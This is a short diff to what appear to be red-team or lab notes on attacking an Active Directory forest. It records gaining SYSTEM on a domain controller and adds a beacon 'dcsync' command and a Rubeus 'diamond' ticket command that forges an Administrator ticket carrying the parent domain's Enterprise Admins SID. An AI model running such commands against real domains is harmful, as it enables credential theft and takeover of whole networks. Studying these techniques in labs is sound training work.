@@ -215,3 +215,9 @@ okay so mssqlsvc was able to get cifs tickets so lets make that account sysadmin
 and we got SYSTEM on DC-1!
 
 ***********
+
+beacon> dcsync dublin.contoso.com
+
+SID of parent domain: S-1-5-21-1076548718-1118529210-2193484809
+
+execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe diamond /tgtdeleg /ticketuser:Administrator /ticketuserid:500 /sids: S-1-5-21-1076548718-1118529210-2193484809-512 /krbkey: /nowrap
